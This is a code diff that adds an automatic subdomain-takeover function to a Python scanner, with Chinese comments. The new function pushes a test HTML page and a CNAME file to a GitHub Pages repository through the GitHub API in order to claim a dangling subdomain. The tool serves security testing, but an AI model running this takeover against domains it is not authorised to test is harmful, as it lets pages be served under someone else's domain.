@@ -3,6 +3,9 @@ import json
 import requests
 import dns.resolver
 import sys,getopt
+import yaml
+import os
+import base64
 
 HEADERS = {
     "Accept":"application/json, text/javascript, */*; q=0.01",
@@ -56,6 +59,45 @@ def sub_check(cname,subdomain):
             except:
                 pass
 
+# 自动接管
+def auto_take(url):
+    with open ('config.yml') as stream:
+        data = yaml.load(stream,Loader=yaml.FullLoader)
+        print('[*]正在读取配置文件...')
+        tokens = '#'
+        html = b'''
+        <html>
+            <p>Subdomain Takerover Test</>
+        </html>
+        '''
+        url = bytes(url,encoding='utf-8')
+        html64 = base64.b64encode(html).decode('utf-8')
+        url64 = base64.b64encode(url).decode('utf-8')
+        html_dict = {
+               "message": "my commit message",
+               "committer": {
+                 "name": "user",
+                 "email": "user@163.com"
+               },
+               "content": html64
+            }
+        url_dict = {
+               "message": "my commit message",
+               "committer": {
+                 "name": "user",
+                 "email": "user@163.com"
+               },
+               "content": url64
+            }
+        html_url = "https://api.github.com/repos/Echocipher/my.djmag.club/contents/index.html"
+        url_url = "https://api.github.com/repos/Echocipher/my.djmag.club/contents/CNAME"
+        headers = {"Authorization": 'token '+tokens} 
+        print('[*]Token验证成功，正在进行自动接管...')
+        html_r = requests.put(url=html_url,data=json.dumps(html_dict), headers=headers)
+        cname_r = requests.put(url=url_url,data=json.dumps(url_dict), headers=headers)
+        rs=cname_r.status_code
+        if rs==201:
+            print('[+]自动接管成功，请访问http://test.djmag.club查看结果')
 # 发起请求
 def url_get(url):
     r = requests.get(url,HEADERS,timeout=5)
@@ -79,7 +121,7 @@ def main(argv):
                                                                                                           
         ''')
     try:
-        opts,args = getopt.getopt(argv,'hu:')
+        opts,args = getopt.getopt(argv,'hu:c:')
     except:
         print('[*]Usage:python subdomain_takeover.py -u <target>')
         sys.exit(2)
@@ -91,6 +133,8 @@ def main(argv):
             subdomain = arg
             cname = cname_get(subdomain)
             sub_check(cname,subdomain)
+        elif opt == '-c':
+            auto_take(subdomain)
 
 if __name__ == '__main__':
     main(sys.argv[1:])
